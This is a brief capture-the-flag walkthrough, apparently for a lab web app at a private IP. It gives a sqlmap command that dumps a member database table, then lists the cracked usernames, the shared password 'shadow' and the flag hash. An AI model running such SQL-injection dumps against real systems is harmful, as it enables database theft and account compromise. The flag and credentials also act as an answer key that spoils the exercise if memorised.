1. go to your pyhton terminal.
2. use "sqlmap.py -u "http://192.168.1.113/index.php?page=member&id=5&Submit=Submit#" --dump -D Member_Brute_Force -T db_default"
3. then use the default dictionary "wordlist.txt"
4. you will get the username and passwowrd. the two usernames you will recieve is "root" and "admin" both of their passwords are "shadow"
5. once you login you will get the flag "THE FLAG IS : B3A6E43DDF8B4BBB4125E5E7D23040433827759D4DE1C04EA63907479A80A6B2"